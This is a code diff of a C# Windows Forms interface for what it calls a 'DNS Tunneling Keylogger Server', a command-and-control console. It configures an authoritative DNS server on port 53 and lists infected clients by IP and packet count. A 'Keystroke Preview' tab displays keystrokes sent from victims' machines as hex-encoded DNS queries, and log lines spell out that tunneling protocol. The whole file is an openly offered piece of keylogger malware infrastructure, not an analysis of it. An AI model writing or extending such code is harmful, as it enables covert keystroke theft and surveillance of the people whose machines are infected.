@@ -1,14 +1,25 @@
 using System.Net;
-using System.Net.Sockets;
-using System.Text;
-using System.Text.Json;
 using Server.Logic;
+using Server.Models;
 
 namespace Server.UI
 {
     public partial class MainForm : Form
     {
-        private ServerLogic serverLogic = null!;
+        private ServerLogic? _serverLogic;
+        private bool _isRunning = false;
+
+        // UI Controls
+        private TextBox txtDomain = null!;
+        private TextBox txtPort = null!;
+        private TextBox txtLogPath = null!;
+        private TextBox txtServerIp = null!;  // NEW
+        private Button btnStartStop = null!;
+        private RichTextBox txtLog = null!;
+        private ListView lvClients = null!;
+        private Label lblStatus = null!;
+        private Label lblConnections = null!;
+        private RichTextBox txtKeystrokePreview = null!;
 
         public MainForm()
         {
@@ -19,256 +30,363 @@ namespace Server.UI
 
         private void InitializeServerLogic()
         {
-            serverLogic = new ServerLogic();
-            serverLogic.OnLogMessage += LogMessage;
-            serverLogic.OnClientAdded += AddClientToList;
-            serverLogic.OnClientRemoved += RemoveClientFromList;
-            serverLogic.OnClientCountChanged += UpdateClientCount;
+            _serverLogic = new ServerLogic();
+            _serverLogic.OnLogMessage += LogMessage;
+            _serverLogic.OnClientAdded += AddClientToList;
+            _serverLogic.OnClientCountChanged += UpdateClientCount;
+            _serverLogic.OnDataReceived += OnKeystrokeReceived;
         }
 
         private void InitializeCustomComponents()
         {
-            this.Text = "DNS Tunneling Server - Port 53 Manager";
-            this.Size = new Size(1000, 700);
+            this.Text = "DNS Tunneling Keylogger Server - Authoritative DNS";
+            this.Size = new Size(1200, 800);
             this.StartPosition = FormStartPosition.CenterScreen;
+            this.FormClosing += MainForm_FormClosing;
 
-            // Status Panel
-            Panel statusPanel = new Panel
+            // === TOP PANEL - Configuration ===
+            Panel configPanel = new Panel
             {
                 Dock = DockStyle.Top,
-                Height = 80,
-                BorderStyle = BorderStyle.FixedSingle
+                Height = 150,  // Increased height
+                BackColor = Color.FromArgb(240, 240, 240),
+                Padding = new Padding(10)
             };
 
-            Label lblStatus = new Label
+            Label lblTitle = new Label
             {
-                Text = "Server Status:",
+                Text = "🔐 Authoritative DNS Server - C&C Keylogger",
+                Font = new Font("Segoe UI", 14, FontStyle.Bold),
                 Location = new Point(10, 10),
                 AutoSize = true,
-                Font = new Font("Arial", 10, FontStyle.Bold)
+                ForeColor = Color.FromArgb(0, 120, 215)
             };
 
-            Label lblServerStatus = new Label
+            // Row 1
+            Label lblDomain = new Label { Text = "Domain:", Location = new Point(10, 45), AutoSize = true };
+            txtDomain = new TextBox
             {
-                Name = "lblServerStatus",
-                Text = "Stopped",
-                Location = new Point(120, 10),
-                AutoSize = true,
-                ForeColor = Color.Red,
-                Font = new Font("Arial", 10, FontStyle.Bold)
+                Location = new Point(90, 43),
+                Width = 200,
+                Text = "example.com"
             };
 
-            Button btnStart = new Button
+            Label lblPort = new Label { Text = "Port:", Location = new Point(310, 45), AutoSize = true };
+            txtPort = new TextBox
             {
-                Name = "btnStart",
-                Text = "Start Server",
-                Location = new Point(10, 40),
-                Size = new Size(120, 30),
-                BackColor = Color.Green,
-                ForeColor = Color.White
+                Location = new Point(350, 43),
+                Width = 80,
+                Text = "53"
             };
-            btnStart.Click += BtnStart_Click;
 
-            Button btnStop = new Button
+            Label lblServerIpLabel = new Label { Text = "Server IP:", Location = new Point(450, 45), AutoSize = true };
+            txtServerIp = new TextBox
             {
-                Name = "btnStop",
-                Text = "Stop Server",
-                Location = new Point(140, 40),
-                Size = new Size(120, 30),
-                BackColor = Color.Red,
+                Location = new Point(520, 43),
+                Width = 150,
+                Text = "127.0.0.1"
+                // Note: Public IP of this server (for NS/A records in production)
+            };
+
+            // Row 2
+            Label lblLogPathLabel = new Label { Text = "Logs:", Location = new Point(10, 75), AutoSize = true };
+            txtLogPath = new TextBox
+            {
+                Location = new Point(90, 73),
+                Width = 200,
+                Text = "./logs"
+            };
+
+            btnStartStop = new Button
+            {
+                Text = "▶ START SERVER",
+                Location = new Point(310, 70),
+                Size = new Size(150, 30),
+                BackColor = Color.FromArgb(0, 120, 215),
                 ForeColor = Color.White,
-                Enabled = false
+                FlatStyle = FlatStyle.Flat,
+                Font = new Font("Segoe UI", 9, FontStyle.Bold)
             };
-            btnStop.Click += BtnStop_Click;
+            btnStartStop.Click += BtnStartStop_Click;
 
-            Button btnClearLogs = new Button
+            lblStatus = new Label
             {
-                Name = "btnClearLogs",
-                Text = "Clear Logs",
-                Location = new Point(270, 40),
-                Size = new Size(120, 30)
-            };
-            btnClearLogs.Click += BtnClearLogs_Click;
-
-            Label lblConnected = new Label
-            {
-                Name = "lblConnected",
-                Text = "Connected Clients: 0",
-                Location = new Point(400, 45),
-                AutoSize = true,
-                Font = new Font("Arial", 9, FontStyle.Bold)
-            };
-
-            statusPanel.Controls.AddRange(new Control[] { lblStatus, lblServerStatus, btnStart, btnStop, btnClearLogs, lblConnected });
-            this.Controls.Add(statusPanel);
-
-            // Clients ListBox
-            Label lblClients = new Label
-            {
-                Text = "Connected Bots:",
-                Location = new Point(10, 90),
-                AutoSize = true,
-                Font = new Font("Arial", 9, FontStyle.Bold)
-            };
-            this.Controls.Add(lblClients);
-
-            ListBox lstClients = new ListBox
-            {
-                Name = "lstClients",
+                Text = "⚫ Stopped",
                 Location = new Point(10, 115),
-                Size = new Size(250, 500),
-                Font = new Font("Consolas", 9)
-            };
-            this.Controls.Add(lstClients);
-
-            // Data Display
-            Label lblData = new Label
-            {
-                Text = "Received Data (JSON Format):",
-                Location = new Point(270, 90),
                 AutoSize = true,
-                Font = new Font("Arial", 9, FontStyle.Bold)
+                Font = new Font("Segoe UI", 10, FontStyle.Bold),
+                ForeColor = Color.Gray
             };
-            this.Controls.Add(lblData);
 
-            RichTextBox txtData = new RichTextBox
+            lblConnections = new Label
             {
-                Name = "txtData",
-                Location = new Point(270, 115),
-                Size = new Size(700, 500),
-                Font = new Font("Consolas", 9),
-                ReadOnly = true,
-                BackColor = Color.Black,
-                ForeColor = Color.LimeGreen
+                Text = "Connections: 0",
+                Location = new Point(150, 115),
+                AutoSize = true,
+                Font = new Font("Segoe UI", 10)
             };
-            this.Controls.Add(txtData);
+
+            configPanel.Controls.AddRange(new Control[] {
+                lblTitle, lblDomain, txtDomain, lblPort, txtPort,
+                lblServerIpLabel, txtServerIp, lblLogPathLabel, txtLogPath, 
+                btnStartStop, lblStatus, lblConnections
+            });
+
+            // === MIDDLE SECTION - Split Container ===
+            SplitContainer splitContainer = new SplitContainer
+            {
+                Dock = DockStyle.Fill,
+                Orientation = Orientation.Horizontal,
+                SplitterDistance = 350
+            };
+
+            // === TOP SPLIT - Clients List ===
+            GroupBox grpClients = new GroupBox
+            {
+                Text = "Connected Clients",
+                Dock = DockStyle.Fill,
+                Padding = new Padding(10)
+            };
+
+            lvClients = new ListView
+            {
+                Dock = DockStyle.Fill,
+                View = View.Details,
+                FullRowSelect = true,
+                GridLines = true
+            };
+            lvClients.Columns.Add("ID", 50);
+            lvClients.Columns.Add("IP Address", 150);
+            lvClients.Columns.Add("Connected At", 150);
+            lvClients.Columns.Add("Packets", 80);
+            lvClients.Columns.Add("Data Size", 100);
+
+            grpClients.Controls.Add(lvClients);
+            splitContainer.Panel1.Controls.Add(grpClients);
+
+            // === BOTTOM SPLIT - Tabs for Logs and Keystrokes ===
+            TabControl tabControl = new TabControl
+            {
+                Dock = DockStyle.Fill
+            };
+
+            // Tab 1: Server Log
+            TabPage tabLog = new TabPage("Server Log");
+            txtLog = new RichTextBox
+            {
+                Dock = DockStyle.Fill,
+                BackColor = Color.Black,
+                ForeColor = Color.Lime,
+                Font = new Font("Consolas", 9),
+                ReadOnly = true
+            };
+            tabLog.Controls.Add(txtLog);
+
+            // Tab 2: Keystroke Preview
+            TabPage tabKeystrokes = new TabPage("Keystroke Preview");
+            txtKeystrokePreview = new RichTextBox
+            {
+                Dock = DockStyle.Fill,
+                BackColor = Color.FromArgb(30, 30, 30),
+                ForeColor = Color.White,
+                Font = new Font("Consolas", 11),
+                ReadOnly = true
+            };
+            tabKeystrokes.Controls.Add(txtKeystrokePreview);
+
+            tabControl.TabPages.Add(tabLog);
+            tabControl.TabPages.Add(tabKeystrokes);
+
+            splitContainer.Panel2.Controls.Add(tabControl);
+
+            // Add all to form
+            this.Controls.Add(splitContainer);
+            this.Controls.Add(configPanel);
+
+            // Initial log
+            LogMessage("=".PadRight(60, '='));
+            LogMessage(" AUTHORITATIVE DNS SERVER - C&C");
+            LogMessage("=".PadRight(60, '='));
+            LogMessage("Role: Act as authoritative DNS for your domain");
+            LogMessage("Protocol:");
+            LogMessage("  Connection:  a.1.1.1.domain → Returns x.x.x.[ConnID]");
+            LogMessage("  Data:        b.[Pkt].[ID].[HexData].domain → Returns [Code].x.x.x");
+            LogMessage("Normal DNS: Responds to NS, SOA, A queries");
+            LogMessage("=".PadRight(60, '='));
         }
 
-        private void BtnStart_Click(object? sender, EventArgs e)
+        private void BtnStartStop_Click(object? sender, EventArgs e)
+        {
+            if (!_isRunning)
+            {
+                StartServer();
+            }
+            else
+            {
+                StopServer();
+            }
+        }
+
+        private void StartServer()
         {
             try
             {
-                serverLogic.StartServer();
+                int port = int.Parse(txtPort.Text);
+                string domain = txtDomain.Text.Trim();
+                string logPath = txtLogPath.Text.Trim();
+                string serverIp = txtServerIp.Text.Trim();
 
-                UpdateUI(() =>
+                if (string.IsNullOrEmpty(domain))
                 {
-                    if (this.Controls.Find("lblServerStatus", true).FirstOrDefault() is Label lblStatus)
-                    {
-                        lblStatus.Text = "Running on Port 53";
-                        lblStatus.ForeColor = Color.Green;
-                    }
+                    MessageBox.Show("Please enter a domain name", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    return;
+                }
 
-                    if (this.Controls.Find("btnStart", true).FirstOrDefault() is Button btnStart)
-                        btnStart.Enabled = false;
+                // Validate IP
+                if (!System.Net.IPAddress.TryParse(serverIp, out _))
+                {
+                    MessageBox.Show("Please enter a valid IP address", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    return;
+                }
 
-                    if (this.Controls.Find("btnStop", true).FirstOrDefault() is Button btnStop)
-                        btnStop.Enabled = true;
-                });
+                // Check if port 53 requires admin
+                if (port <= 1024)
+                {
+                    MessageBox.Show(
+                        "Port 53 requires Administrator privileges!\n\n" +
+                        "Please run this application as Administrator.",
+                        "Administrator Required",
+                        MessageBoxButtons.OK,
+                        MessageBoxIcon.Warning
+                    );
+                }
+
+                _serverLogic?.Start(port, domain, logPath, serverIp);
+                _isRunning = true;
+
+                // Update UI
+                btnStartStop.Text = "⏹ STOP SERVER";
+                btnStartStop.BackColor = Color.FromArgb(192, 0, 0);
+                lblStatus.Text = "🟢 Running";
+                lblStatus.ForeColor = Color.Green;
+                txtDomain.Enabled = false;
+                txtPort.Enabled = false;
+                txtLogPath.Enabled = false;
+                txtServerIp.Enabled = false;
+
+                LogMessage("\n>>> Authoritative DNS Server is LIVE <<<");
+                LogMessage($">>> Configure domain registrar to point NS to this IP <<<\n");
             }
             catch (Exception ex)
             {
-                MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                MessageBox.Show($"Failed to start server:\n{ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                LogMessage($"[ERROR] {ex.Message}");
             }
         }
 
-        private void BtnStop_Click(object? sender, EventArgs e)
+        private void StopServer()
         {
-            serverLogic.StopServer();
+            _serverLogic?.Stop();
+            _isRunning = false;
 
-            UpdateUI(() =>
-            {
-                if (this.Controls.Find("lblServerStatus", true).FirstOrDefault() is Label lblStatus)
-                {
-                    lblStatus.Text = "Stopped";
-                    lblStatus.ForeColor = Color.Red;
-                }
-
-                if (this.Controls.Find("btnStart", true).FirstOrDefault() is Button btnStart)
-                    btnStart.Enabled = true;
-
-                if (this.Controls.Find("btnStop", true).FirstOrDefault() is Button btnStop)
-                    btnStop.Enabled = false;
-            });
+            // Update UI
+            btnStartStop.Text = "▶ START SERVER";
+            btnStartStop.BackColor = Color.FromArgb(0, 120, 215);
+            lblStatus.Text = "⚫ Stopped";
+            lblStatus.ForeColor = Color.Gray;
+            txtDomain.Enabled = true;
+            txtPort.Enabled = true;
+            txtLogPath.Enabled = true;
+            txtServerIp.Enabled = true;
         }
 
-        private void BtnClearLogs_Click(object? sender, EventArgs e)
+        private void LogMessage(string message)
         {
-            if (this.Controls.Find("txtData", true).FirstOrDefault() is RichTextBox txtData)
+            if (txtLog.InvokeRequired)
             {
-                txtData.Clear();
+                txtLog.Invoke(() => LogMessage(message));
+                return;
             }
+
+            txtLog.AppendText(message + "\n");
+            txtLog.ScrollToCaret();
         }
 
-        private void LogMessage(string message, Color color)
+        private void AddClientToList(ClientInfo client)
         {
-            UpdateUI(() =>
+            if (lvClients.InvokeRequired)
             {
-                if (this.Controls.Find("txtData", true).FirstOrDefault() is RichTextBox txtData)
-                {
-                    txtData.SelectionStart = txtData.TextLength;
-                    txtData.SelectionLength = 0;
-                    txtData.SelectionColor = color;
-                    txtData.AppendText(message + "\n");
-                    txtData.ScrollToCaret();
-                }
-            });
-        }
+                lvClients.Invoke(() => AddClientToList(client));
+                return;
+            }
 
-        private void AddClientToList(string clientInfo)
-        {
-            UpdateUI(() =>
-            {
-                if (this.Controls.Find("lstClients", true).FirstOrDefault() is ListBox lstClients)
-                {
-                    lstClients.Items.Add(clientInfo);
-                }
-            });
-        }
+            var item = new ListViewItem(client.ConnectionId.ToString());
+            item.SubItems.Add(client.IpAddress);
+            item.SubItems.Add(client.ConnectedAt.ToString("HH:mm:ss"));
+            item.SubItems.Add(client.PacketsReceived.ToString());
+            item.SubItems.Add($"{client.DataLength} bytes");
+            item.Tag = client.ConnectionId;
 
-        private void RemoveClientFromList(string clientId)
-        {
-            UpdateUI(() =>
-            {
-                if (this.Controls.Find("lstClients", true).FirstOrDefault() is ListBox lstClients)
-                {
-                    for (int i = lstClients.Items.Count - 1; i >= 0; i--)
-                    {
-                        if (lstClients.Items[i].ToString()?.StartsWith(clientId) == true)
-                        {
-                            lstClients.Items.RemoveAt(i);
-                        }
-                    }
-                }
-            });
+            lvClients.Items.Add(item);
         }
 
         private void UpdateClientCount(int count)
         {
-            UpdateUI(() =>
+            if (lblConnections.InvokeRequired)
             {
-                if (this.Controls.Find("lblConnected", true).FirstOrDefault() is Label lblConnected)
+                lblConnections.Invoke(() => UpdateClientCount(count));
+                return;
+            }
+
+            lblConnections.Text = $"Connections: {count}";
+        }
+
+        private void OnKeystrokeReceived(int connectionId, string data)
+        {
+            if (txtKeystrokePreview.InvokeRequired)
+            {
+                txtKeystrokePreview.Invoke(() => OnKeystrokeReceived(connectionId, data));
+                return;
+            }
+
+            txtKeystrokePreview.SelectionColor = Color.Yellow;
+            txtKeystrokePreview.AppendText($"[Conn #{connectionId}] ");
+            txtKeystrokePreview.SelectionColor = Color.White;
+            txtKeystrokePreview.AppendText(data);
+            txtKeystrokePreview.ScrollToCaret();
+
+            // Update client list
+            foreach (ListViewItem item in lvClients.Items)
+            {
+                if ((int)item.Tag == connectionId)
                 {
-                    lblConnected.Text = $"Connected Clients: {count}";
+                    int packets = int.Parse(item.SubItems[3].Text) + 1;
+                    item.SubItems[3].Text = packets.ToString();
+                    break;
                 }
-            });
-        }
-
-        private void UpdateUI(Action action)
-        {
-            if (this.InvokeRequired)
-            {
-                this.Invoke(action);
-            }
-            else
-            {
-                action();
             }
         }
 
-        protected override void OnFormClosing(FormClosingEventArgs e)
+        private void MainForm_FormClosing(object? sender, FormClosingEventArgs e)
         {
-            serverLogic.StopServer();
-            base.OnFormClosing(e);
+            if (_isRunning)
+            {
+                var result = MessageBox.Show(
+                    "Server is still running. Stop and exit?",
+                    "Confirm Exit",
+                    MessageBoxButtons.YesNo,
+                    MessageBoxIcon.Question
+                );
+
+                if (result == DialogResult.Yes)
+                {
+                    StopServer();
+                }
+                else
+                {
+                    e.Cancel = true;
+                }
+            }
         }
     }
 }
